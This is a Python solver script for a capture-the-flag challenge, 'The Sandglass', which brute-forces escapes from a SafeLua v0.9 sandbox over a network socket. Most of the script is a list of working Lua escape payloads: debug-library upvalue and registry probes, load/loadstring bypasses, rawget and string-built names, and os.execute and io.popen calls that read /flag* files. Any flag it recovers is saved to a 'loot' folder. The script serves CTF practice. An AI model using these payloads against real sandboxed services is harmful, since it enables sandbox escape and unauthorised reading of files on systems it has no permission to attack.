#!/usr/bin/env python3 -I
"""
The Sandglass (POCTF 2026, ID=128) - SafeLua v0.9 sandbox escape.

The prompt says: "SafeLua v0.9 sandbox with a whitelist."
Sandbox source is provided for inspection.

Common Lua sandbox escapes:
1. loadstring/load with bytecode
2. debug library access
3. string.dump + load
4. getfenv/setfenv manipulation
5. metatables __index/__newindex on _G
6. coroutine.wrap to access different environments
7. string library abuse (string.rep for DoS, string.char for byte manipulation)
8. io/os through hidden references
9. rawget/rawset bypassing metatables

Usage: python3 -I solve_sandbox.py <host> <port> <token>
"""
import socket
import sys
import time
import re
import pathlib


def recv_all(sock, timeout=3):
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    return data.decode("utf-8", errors="replace")


def send_recv(sock, msg, timeout=3):
    sock.sendall((msg + "\n").encode())
    time.sleep(0.5)
    return recv_all(sock, timeout)


def find_flag(text):
    m = re.search(r'POCTF\{[^}]+\}', text)
    return m.group(0) if m else None


LUA_PAYLOADS = [
    # Basic flag reading
    'print(FLAG)',
    'print(flag)',
    'print(_G.FLAG)',
    'print(_G.flag)',

    # Environment scanning
    'for k,v in pairs(_G) do print(k,v) end',
    'for k,v in pairs(getfenv()) do print(k,v) end',

    # Metatable access
    'print(getmetatable("").__index)',
    'mt = getmetatable(""); for k,v in pairs(mt) do print(k,v) end',

    # debug library
    'print(debug.getinfo(1))',
    'for i=1,10 do local n,v = debug.getlocal(2,i); if n then print(n,v) end end',
    'for i=1,10 do local n,v = debug.getupvalue(print,i); if n then print(n,v) end end',

    # Registry access
    'print(debug.getregistry())',
    'for k,v in pairs(debug.getregistry()) do print(k,v) end',

    # Load/loadstring bypass
    'load("print(FLAG)")()',
    'loadstring("print(FLAG)")()',

    # coroutine trick
    'co = coroutine.create(function() for k,v in pairs(_G) do print(k,v) end end); coroutine.resume(co)',

    # rawget bypass
    'print(rawget(_G, "FLAG"))',
    'print(rawget(_G, "flag"))',

    # String manipulation to build function names
    'f = _G[string.char(70,76,65,71)]; print(f)',
    'f = _G["FL".."AG"]; print(f)',

    # io/os access attempts
    'print(io)',
    'print(os.execute("cat /flag*"))',
    'print(io.popen("cat /flag*"):read("*a"))',

    # package access
    'print(package)',
    'require("os")',

    # Sandbox-specific: often the flag is in an upvalue
    'for i=1,100 do local n,v=debug.getupvalue(sandbox_check or print,i); if n then print(i,n,v) end end',

    # pcall to suppress errors while probing
    'for k,v in pairs(_G) do pcall(function() print(k, tostring(v)) end) end',

    # Time-related (sandglass theme)
    'print(os.time())',
    'print(os.clock())',
]


def solve(host, port, token):
    print(f"[*] Target: {host}:{port}")

    # First, do recon
    print("[*] Recon: connecting to get banner and protocol...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((host, int(port)))
        banner = recv_all(sock, 3)
        print(f"[BANNER]\n{banner}")

        resp = send_recv(sock, token)
        print(f"[AFTER TOKEN]\n{resp}")

        for i in range(3):
            resp = send_recv(sock, f"print('test{i}')")
            print(f"[TEST {i}]\n{resp}")
            if not resp:
                break

        sock.close()
    except Exception as e:
        print(f"[!] Recon error: {e}")

    # Try payloads
    for payload in LUA_PAYLOADS:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((host, int(port)))
            recv_all(sock, 2)
            send_recv(sock, token)

            resp = send_recv(sock, payload, timeout=5)
            flag = find_flag(resp)
            if flag:
                print(f"\n[+] FLAG with payload: {payload}")
                print(f"[+] FLAG: {flag}")
                sock.close()
                return flag

            if resp.strip() and 'error' not in resp.lower() and 'nil' not in resp.lower():
                print(f"  [*] Interesting: {payload[:50]} -> {resp.strip()[:100]}")

            sock.close()
        except Exception:
            pass

    print("[!] No flag found. Need manual analysis of sandbox source.")
    return None


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 -I solve_sandbox.py <host> <port> <token>")
        sys.exit(1)

    flag = solve(sys.argv[1], sys.argv[2], sys.argv[3])
    if flag:
        outdir = pathlib.Path(__file__).parent.parent / "loot"
        outdir.mkdir(exist_ok=True)
        (outdir / "flag.txt").write_text(flag + "\n")
